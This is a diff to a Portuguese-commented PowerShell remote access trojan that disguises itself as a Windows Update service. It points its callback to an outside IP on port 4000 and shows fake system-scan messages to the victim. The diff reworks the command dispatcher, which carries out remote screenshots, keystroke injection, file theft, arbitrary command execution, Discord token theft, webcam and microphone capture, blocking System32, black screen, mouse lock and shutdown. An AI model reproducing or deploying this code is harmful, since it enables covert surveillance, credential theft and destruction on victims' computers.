@@ -8,7 +8,7 @@ Version: 10.0.19045.1
 #>
 
 # ===== CONFIGURACOES =====
-$serverIP = "192.168.0.4"  # MUDE PARA SEU IP
+$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
 $serverPort = 4000
 $installName = "WinUpdateSvc"
 $mutexName = "Global\MicrosoftWindowsUpdateService_{F2E3B8A1-9B6D-4F8E-9C5A-8B3D7E2F1C6A}"
@@ -30,9 +30,6 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Write-Host "║                                                            ║"
     Write-Host "║  Por favor, execute o PowerShell como Administrador       ║"
     Write-Host "║  e tente novamente.                                        ║"
-    Write-Host "║                                                            ║"
-    Write-Host "║  Clique com botão direito no PowerShell                    ║"
-    Write-Host "║  e selecione 'Executar como Administrador'                 ║"
     Write-Host "╚════════════════════════════════════════════════════════════╝"
     Write-Host ""
     $host.UI.RawUI.ForegroundColor = "White"
@@ -141,11 +138,11 @@ Write-Host ""
 Start-Sleep -Milliseconds 500
 
 $logs = @(
-    "Inicializando modulo de verificacao do sistema...",
-    "Carregando bibliotecas de analise...",
-    "Verificando integridade do sistema...",
-    "Escaneando arquivos criticos do Windows...",
-    "Analisando processos em execucao...",
+    "Inicializando modulo de verificacao do sistema..."
+    "Carregando bibliotecas de analise..."
+    "Verificando integridade do sistema..."
+    "Escaneando arquivos criticos do Windows..."
+    "Analisando processos em execucao..."
     "Detectando possiveis ameacas..."
 )
 
@@ -666,12 +663,7 @@ while ($true) {
             if ([string]::IsNullOrEmpty($cmd)) { continue }
             
             switch -Wildcard ($cmd) {
-                # ===== TELA =====
-                "screenshot" { 
-                    $writer.WriteLine((Get-ScreenCapture))
-                }
-                
-                # ===== MOUSE =====
+                "screenshot" { $writer.WriteLine((Get-ScreenCapture)) }
                 "move *" { 
                     $pos = $cmd.Replace("move ","").Split(" ")
                     if ($pos.Count -ge 2) {
@@ -680,8 +672,6 @@ while ($true) {
                 }
                 "click" { $writer.WriteLine((Click-Mouse)) }
                 "rightclick" { $writer.WriteLine((RightClick-Mouse)) }
-                
-                # ===== TECLADO =====
                 "key *" { 
                     $key = $cmd.Replace("key ","")
                     $writer.WriteLine((Send-Key $key))
@@ -690,8 +680,6 @@ while ($true) {
                     $text = $cmd.Replace("type ","")
                     $writer.WriteLine((Send-Text $text))
                 }
-                
-                # ===== ARQUIVOS =====
                 "ls *" { 
                     $path = $cmd.Replace("ls ","")
                     $writer.WriteLine((Get-FileList $path))
@@ -700,80 +688,38 @@ while ($true) {
                     $file = $cmd.Replace("download ","")
                     $writer.WriteLine((Download-File $file))
                 }
-                
-                # ===== EXECUTAR COMANDO =====
                 "exec *" { 
                     $command = $cmd.Substring(5)
                     $result = Execute-Command $command
                     $writer.WriteLine($result)
                 }
-                
-                # ===== DISCORD TOKEN =====
-                "discord" {
-                    $result = Get-DiscordToken
-                    $writer.WriteLine($result)
-                }
-                
-                # ===== DESTRUTIVAS =====
-                "block_system32" {
-                    $writer.WriteLine((Block-System32))
-                }
-                "black_screen" {
+                "discord" { $result = Get-DiscordToken; $writer.WriteLine($result) }
+                "block_system32" { $writer.WriteLine((Block-System32)) }
+                "black_screen" { 
                     $ps = [powershell]::Create()
                     $ps.AddScript({ Show-BlackScreen }).BeginInvoke()
                     $writer.WriteLine("BLACK_SCREEN")
                 }
-                "unlock_screen" {
-                    $writer.WriteLine((Hide-BlackScreen))
-                }
-                "lock_mouse" {
-                    $writer.WriteLine((Lock-Mouse))
-                }
-                "unlock_mouse" {
-                    $writer.WriteLine((Unlock-Mouse))
-                }
-                "shutdown" {
-                    $writer.WriteLine((Power-Control "shutdown"))
-                }
-                "reboot" {
-                    $writer.WriteLine((Power-Control "reboot"))
-                }
-                
-                # ===== PERIFERICOS =====
-                "mic" {
-                    $writer.WriteLine((Get-Microphone))
-                }
-                "webcam" {
-                    $writer.WriteLine((Get-Webcam))
-                }
-                
-                # ===== SISTEMA =====
-                "processes" {
-                    $writer.WriteLine((Get-ProcessList))
-                }
-                "url *" {
+                "unlock_screen" { $writer.WriteLine((Hide-BlackScreen)) }
+                "lock_mouse" { $writer.WriteLine((Lock-Mouse)) }
+                "unlock_mouse" { $writer.WriteLine((Unlock-Mouse)) }
+                "shutdown" { $writer.WriteLine((Power-Control "shutdown")) }
+                "reboot" { $writer.WriteLine((Power-Control "reboot")) }
+                "mic" { $writer.WriteLine((Get-Microphone)) }
+                "webcam" { $writer.WriteLine((Get-Webcam)) }
+                "processes" { $writer.WriteLine((Get-ProcessList)) }
+                "url *" { 
                     $url = $cmd.Replace("url ","")
                     $writer.WriteLine((Open-Url $url))
                 }
-                
-                # ===== NOVAS FUNÇÕES DE USUÁRIO =====
-                "list_users" {
-                    $writer.WriteLine((Get-RATUsers))
-                }
-                "remove_user *" {
+                "list_users" { $writer.WriteLine((Get-RATUsers)) }
+                "remove_user *" { 
                     $userToRemove = $cmd.Replace("remove_user ","")
                     $writer.WriteLine((Remove-UserFromRAT $userToRemove))
                 }
-                "remove_current_user" {
-                    $writer.WriteLine((Remove-UserFromRAT $currentUser))
-                }
-                
-                # ===== TESTE =====
+                "remove_current_user" { $writer.WriteLine((Remove-UserFromRAT $currentUser)) }
                 "test" { $writer.WriteLine("PONG") }
-                
-                # ===== SAIR =====
                 "exit" { break }
-                
                 default { $writer.WriteLine("Comando nao reconhecido") }
             }
         }
